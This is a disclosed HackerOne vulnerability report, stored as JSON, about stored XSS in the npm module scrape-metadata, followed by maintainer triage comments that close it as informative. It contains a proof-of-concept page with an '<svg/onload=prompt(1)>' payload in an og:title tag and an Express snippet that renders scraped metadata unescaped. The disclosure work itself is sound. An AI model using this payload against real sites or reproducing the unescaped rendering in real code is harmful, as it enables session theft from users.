@@ -1,0 +1,580 @@
+{
+    "id": 369573,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjk1NzM=",
+    "url": "https://hackerone.com/reports/369573",
+    "title": "stored xss in scrape-metadata when reading metadata from an html page",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "high",
+    "readable_substate": "Informative",
+    "created_at": "2018-06-21T15:16:13.694Z",
+    "submitted_at": "2018-06-21T15:16:13.694Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "johnssimon007",
+        "url": "/johnssimon007",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 23949,
+        "url": "https://hackerone.com/nodejs-ecosystem",
+        "handle": "nodejs-ecosystem",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "disabled",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Node.js third-party modules",
+            "twitter_handle": "",
+            "website": "https://nodejs.org/en/security/",
+            "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2018-07-27T11:25:18.117Z",
+    "bug_reporter_agreed_on_going_public_at": "2018-07-27T11:16:52.919Z",
+    "team_member_agreed_on_going_public_at": "2018-07-27T11:25:17.954Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Hy\n\n# Module\nscrape-metadata\nhttps://www.npmjs.com/package/scrape-metadata\n\n## Module Description\na module used to scrape meta data contents from an article\n\n## Vulnerability Description\nIt was possible to embed malicious js code in metadata content read by scrape-metadata. When library reads such metadata, there was no sanitization performed. If output from scrape-metadata is rendered directly in HTML code,it can lead to xss/html injection.\n\n## Steps To Reproduce:\ncreate a website, I used a local server available at http://127.0.0.1:8080\nBelow is html file with js code injected in 'og:title property' and i uploaded the file to my\nremote server http://pokegen.in/test.html\n\n<!doctype html>\n<html xmlns:og=\"http://ogp.me/ns#\" lang=\"en\">\n\n<head>\n    <meta charset=\"utf8\">\n    <title>scrap-meta</title>\n\n    <meta property=\"og:description\" content=\"hackerone\">\n    <meta property=\"og:image\" content=\"image\">\n    <meta property=\"og:title\" content='https://google.com<svg/onload=prompt(1)>'>\n    <meta property=\"og:type\" content=\"article\">\n</head>\n<body>\n</body>\n</html>\n\ninstall scrape-metadata\nnpm install scrape-metadata\n\nconst http=require('http');\nconst server=http.createServer();\nconst express=require('express');\nconst app=express();\nconst scrape = require('scrape-metadata')\nvar url = \"http://pokegen.in/test.html\";\napp.get('/scrap', function(req, res) {\nscrape(url, (err, meta) => {\n    console.log(meta)\n      let __html = `\n               <div>\n                   <p>site title:${JSON.stringify(meta)}</p>\n               </div>\n           `\n           res.send(__html)\n  });\n\n});\n\napp.listen(8080)\n\nsave this as scrap.js\nnow run the app,node scrap.js\nnow goto http://127.0.0.1:8080/scrap on browser.and you will get a javascript prompt\n\nSupporting Material/References:\n\nConfiguration I've used to find this vulnerability:\nwindows 7\nnode 8.9.3\nnpm 5.5.1\ncurl 7.54.0\n# Wrap up\n If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\njohns simon\n\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\nThis might lead to stealing session cookies from infected website, and much more sophisticated attacks",
+    "weakness": {
+        "id": 62,
+        "name": "Cross-site Scripting (XSS) - Stored"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 5,
+    "voters": [
+        "sameerphad72",
+        "bl4de",
+        "apapedulimu",
+        "johnssimon007",
+        "cryptographer"
+    ],
+    "severity": {
+        "rating": "high",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 11573,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "scrape-metadata",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 2919538,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello,\nThanks for reporting this to us. Someone will quickly look at this report and triage it.",
+            "automated_response": true,
+            "created_at": "2018-06-22T03:32:09.431Z",
+            "updated_at": "2018-06-22T03:32:09.431Z",
+            "actor": {
+                "username": "vdeturckheim_dev",
+                "cleared": false,
+                "verified": false,
+                "url": "/vdeturckheim_dev",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 2923226,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-06-22T18:25:02.588Z",
+            "updated_at": "2018-06-22T18:25:02.588Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 2923239,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-06-22T18:29:17.853Z",
+            "updated_at": "2018-06-22T18:29:17.853Z",
+            "actor": {
+                "username": "bevacqua",
+                "cleared": false,
+                "verified": false,
+                "url": "/bevacqua",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/295/962/3bee8143ccec45bd35c3b678f7f77aa7a72ddebb_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 2923240,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @5ilverhawk\n\nThanks for reporting this issue.\n\nI'm not so sure that this XSS falls under the responsibility of the scrape-metadata module. It will require knowing in advance the target content type to encode the data for in order to escape it properly.\n\nI will invite the package maintainer to this issue to further discuss.\n",
+            "automated_response": false,
+            "created_at": "2018-06-22T18:29:36.179Z",
+            "updated_at": "2018-06-22T18:29:36.179Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 2923247,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Agreed, I'd expect consumers to sanitize this content before embedding in HTML, as they would any untrusted user input.",
+            "automated_response": false,
+            "created_at": "2018-06-22T18:31:32.518Z",
+            "updated_at": "2018-06-22T18:31:32.518Z",
+            "actor": {
+                "username": "bevacqua",
+                "cleared": false,
+                "verified": false,
+                "url": "/bevacqua",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/295/962/3bee8143ccec45bd35c3b678f7f77aa7a72ddebb_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 2924100,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@ bevacqua\nI am not sure if XSS payloads in <meta> tags shouldn't be sanitized by scape-metadata itself - it's not the place where you expect to find <script> tag and some JavaScript code :) .so as most developers might assumes its safe\n\n  simple HTML escaping is all you need to do to make sure output is safe:\n\nhttps://www.npmjs.com/package/escape-html\n\nBesides the fix, maybe we should also add a note to the package's README about security concerns as @lirantal proposed in case https://hackerone.com/reports/309367\n\n",
+            "automated_response": false,
+            "created_at": "2018-06-23T02:31:05.141Z",
+            "updated_at": "2018-06-23T02:31:05.141Z",
+            "actor": {
+                "username": "johnssimon007",
+                "cleared": false,
+                "verified": false,
+                "url": "/johnssimon007",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 2924264,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I think it's a good idea to add a security disclaimer to the module as @5ilverhawk suggested.\nWDYT @bevacqua ?",
+            "automated_response": false,
+            "created_at": "2018-06-23T06:23:49.783Z",
+            "updated_at": "2018-06-23T06:23:49.783Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 2960515,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ChangedScope",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-06-29T21:57:35.389Z",
+            "updated_at": "2018-06-29T21:57:35.389Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "old_scope": "Other module",
+            "new_scope": "scrape-metadata",
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 2960519,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@bevacqua will you please be able to follow-up on adding a security disclaimer on the README as well as investigating what @5ilverhawk suggested?",
+            "automated_response": false,
+            "created_at": "2018-06-29T21:58:49.794Z",
+            "updated_at": "2018-06-29T21:58:49.794Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3058300,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hy @lirantal it seems there is no response from package maintainer..",
+            "automated_response": false,
+            "created_at": "2018-07-17T17:53:56.711Z",
+            "updated_at": "2018-07-17T17:53:56.711Z",
+            "actor": {
+                "username": "johnssimon007",
+                "cleared": false,
+                "verified": false,
+                "url": "/johnssimon007",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3058638,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Looks like it. Seems like we'll close it as informative and leave it at that. \nWhat about if you open an issue in the github repository to raise the security concern and recommend them to  update the README ?",
+            "automated_response": false,
+            "created_at": "2018-07-17T19:28:46.843Z",
+            "updated_at": "2018-07-17T19:28:46.843Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3105176,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@bevacqua another friendly reminder to add a security disclaimer to the project's README\n@5ilverhawk I will go ahead and close this issue and what I suggest is that you may open an issue about this in the project's github and also maybe a PR to add that security disclaimer? ",
+            "automated_response": false,
+            "created_at": "2018-07-27T11:11:53.348Z",
+            "updated_at": "2018-07-27T11:11:53.348Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3105177,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "Closing for informative reasons.",
+            "automated_response": false,
+            "created_at": "2018-07-27T11:12:14.743Z",
+            "updated_at": "2018-07-27T11:12:14.743Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3105203,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-07-27T11:16:52.956Z",
+            "updated_at": "2018-07-27T11:16:52.956Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "johnssimon007",
+                "cleared": false,
+                "verified": false,
+                "url": "/johnssimon007",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3105207,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@lirantal  yep..i will do it.And thanks for following up",
+            "automated_response": false,
+            "created_at": "2018-07-27T11:17:53.130Z",
+            "updated_at": "2018-07-27T11:17:53.130Z",
+            "actor": {
+                "username": "johnssimon007",
+                "cleared": false,
+                "verified": false,
+                "url": "/johnssimon007",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3105214,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "No problems.\nThanks for submitting the report and hoping to collaborate more in the future!",
+            "automated_response": false,
+            "created_at": "2018-07-27T11:19:07.787Z",
+            "updated_at": "2018-07-27T11:19:07.787Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3105228,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@lirantal antal?can you disclose the issue?",
+            "automated_response": false,
+            "created_at": "2018-07-27T11:24:55.242Z",
+            "updated_at": "2018-07-27T11:24:55.242Z",
+            "actor": {
+                "username": "johnssimon007",
+                "cleared": false,
+                "verified": false,
+                "url": "/johnssimon007",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3105229,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-07-27T11:25:18.006Z",
+            "updated_at": "2018-07-27T11:25:18.006Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3105230,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-07-27T11:25:18.160Z",
+            "updated_at": "2018-07-27T11:25:18.160Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 3105231,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Yes, just did.",
+            "automated_response": false,
+            "created_at": "2018-07-27T11:25:31.298Z",
+            "updated_at": "2018-07-27T11:25:31.298Z",
+            "actor": {
+                "username": "lirantal",
+                "cleared": false,
+                "verified": false,
+                "url": "/lirantal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
